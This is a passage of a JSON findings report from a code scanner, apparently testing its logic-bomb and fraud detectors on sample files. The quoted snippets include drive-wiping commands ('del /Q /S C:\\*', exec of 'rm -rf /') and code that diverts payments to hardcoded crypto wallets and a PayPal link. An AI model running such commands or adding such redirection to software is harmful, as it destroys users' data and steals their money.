    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.540764"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "paypal_link = \"paypal.me/developer123\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.541765",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "bd169a5a-f579-4dce-a4f5-d00c56c1c7a5",
    "last_modified": "",
    "line_number": 114,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.541765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Secret transfer to crypto wallet.\"\"\"",
    "column": 31,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.541765",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "df8022ce-4c8c-4a4f-b2d1-3afa0e08360d",
    "last_modified": "",
    "line_number": 119,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.541765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "bitcoin_address = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.541765",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "8d3866e3-c1e9-4394-9a9d-d393a5975229",
    "last_modified": "",
    "line_number": 120,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.541765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_money(slush_fund_total, my_personal_account)",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.541765",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "94df264a-e66f-419b-a445-26a945a3c154",
    "last_modified": "",
    "line_number": 162,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.541765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Send amount to developer's crypto wallet.\"\"\"",
    "column": 39,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.542771",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "20610a66-0fdd-407a-a8da-3873794c468f",
    "last_modified": "",
    "line_number": 201,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.542771"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "self.crypto_transfer(amount, selected_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.542771",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "d8bcda5c-bc9d-49e6-9970-2127f15c51ce",
    "last_modified": "",
    "line_number": 215,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.542771"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def crypto_transfer(self, amount, wallet_address):",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.542771",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "d5b88d57-0f3c-494d-8a7a-8842ca20d2d4",
    "last_modified": "",
    "line_number": 217,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.542771"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Transfer to cryptocurrency wallet.\"\"\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.543771",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "5ade02fb-9132-448f-bdec-681b60688177",
    "last_modified": "",
    "line_number": 218,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.543771"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "shutil.rmtree('/important_folder')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.551765",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "ff87fcfb-0d52-4026-900f-43fb85abf012",
    "last_modified": "",
    "line_number": 8,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.551765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.system('del /Q /S C:\\\\*')",
    "column": 8,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.552766",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "ca8699e7-5058-420e-b5c3-52adbeaf1e5b",
    "last_modified": "",
    "line_number": 9,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.552766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "exec(\"__import__('os').system('rm -rf /')\")",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.552766",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "9b4c8f9a-72a4-4b83-bddc-cc87c1a1cc64",
    "last_modified": "",
    "line_number": 12,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Code execution - System compromise risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.552766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/critical.txt')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.552766",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "high_risk_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
    "id": "0e966c4c-3108-43ca-a828-9c19d6996270",
    "last_modified": "",
    "line_number": 16,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T20:51:09.552766"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# Redirect payment to developer account",
    "column": 11,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.554767",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "00b1e308-5e33-4e4d-b9d6-35926db9369c",
    "last_modified": "",
    "line_number": 10,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.554767"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "crypto_wallet = \"0x742d35Cc6634C0532925a3b8D40F4174e3A59339\"",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.555765",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "d0c364e1-149f-420c-bb9c-ed96ef5a6aa2",
    "last_modified": "",
    "line_number": 22,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.555765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_crypto(fee * 0.01, crypto_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.555765",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "2a2e5866-9bd2-4063-b76a-473bdb8f2b5c",
    "last_modified": "",
    "line_number": 23,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.555765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "paypal_link = \"paypal.me/developer123\"",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.555765",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "7938fd74-05c3-4e10-bbbb-719dc5b276ff",
    "last_modified": "",
    "line_number": 27,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.555765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "redirect_payment(amount * 0.001, paypal_link)",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.555765",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "e86c49dc-cf0e-4e09-9a1b-a30e396bdc3d",
    "last_modified": "",
    "line_number": 28,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.555765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def transfer_crypto(amount, wallet):",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.555765",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "d55e7dd1-ed61-4e37-9c62-16d7992db870",
    "last_modified": "",
    "line_number": 41,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.555765"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "\"\"\"Transfer to crypto wallet.\"\"\"",
    "column": 20,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.556770",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "eb7cca4b-dad7-4a67-b776-706c9a0ee26f",
    "last_modified": "",
    "line_number": 42,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.556770"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "def redirect_payment(amount, paypal):",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.556770",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "fe740223-fc68-4dc1-869f-265c682be563",
    "last_modified": "",
    "line_number": 45,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.556770"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "exec(\"transfer_money(100, 'hidden_account')\")",
    "column": 7,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.556770",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "803ab85d-2985-4a1f-b561-d54d939fb3aa",
    "last_modified": "",
    "line_number": 54,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Code execution - System compromise risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "752ff3df-a2ec-4926-9d91-4b65e70b88bc",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T20:51:09.556770"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# PATTERN 8: Hardcoded Bitcoin address",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T20:51:09.556770",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "simple_financial_fraud_test.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
    "id": "8f1aeec6-155a-4758-9480-12872e3e6414",
    "last_modified": "",
    "line_number": 56,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
